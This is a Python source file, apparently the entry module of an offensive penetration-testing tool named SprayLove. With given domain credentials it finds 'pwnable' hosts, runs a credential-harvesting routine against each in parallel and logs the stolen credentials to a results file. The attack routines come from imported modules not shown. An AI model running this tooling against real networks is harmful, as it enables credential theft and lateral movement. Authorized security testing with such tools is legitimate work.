# coding: utf-8

# Author:	Lyderic LEFEBVRE
# Twitter:	@lydericlefebvre
# Mail:		lylefebvre.infosec@gmail.com
# LinkedIn:	https://www.linkedin.com/in/lydericlefebvre


# Imports
import logging, traceback
from core.User import *
from core.Resources import *
from core.Targets import *
from core.SprayLove import *
from core.Colors import *
from core.Utils import *
from multiprocessing import Process

def run(args):
    jobs = []

    user = User(args.domain, args.username, args.password)
    local_ip = retrieveMyIP()

    try:
        targets = listPwnableTargets(args.targets, user)

        logging.warning("%sLet's spray some love... Be patient." % (warningGre))

        for target in targets:
            jobs.append(Process(target=sprayLove, args=(user, target, local_ip, args.remove)))
            jobs[-1].start()

        joinThreads(jobs, args.wait)
        logging.warning("\n%sCredentials logged into: %s" % (warningGre, os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'results', 'creds.txt')))

    except KeyboardInterrupt:
        logging.warning("%sKeyboard interrupt. Exiting." % (warningRed))
    except Exception as e:
        logging.warning("%sA problem occurs. Err: %s" % (warningRed, red))
        logging.debug("%s==== STACKTRACE ====" % (blue))
        if logging.getLogger().getEffectiveLevel() <= 10: traceback.print_exc(file=sys.stdout)
        logging.debug("%s==== STACKTRACE ====%s" % (blue, white))
    finally:
        exit_gracefully(jobs, 10)
